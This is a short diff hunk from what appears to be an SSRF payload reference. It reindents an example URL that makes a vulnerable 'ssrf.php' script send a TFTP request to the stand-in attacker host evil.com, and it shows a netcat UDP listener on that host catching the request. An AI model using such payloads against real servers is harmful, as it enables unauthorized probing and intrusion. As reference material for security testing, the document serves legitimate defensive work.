@@ -139,7 +139,7 @@ It is an application protocol used over an IP network to manage and access the d
  
  Trivial File Transfer Protocol is a simple lockstep File Transfer Protocol which allows a client to get a file from or put a file onto a remote host
  
-      http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
+    http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET
 
       evil.com:# nc -lvup 1337
       Listening on [0.0.0.0] (family 0, port 1337)
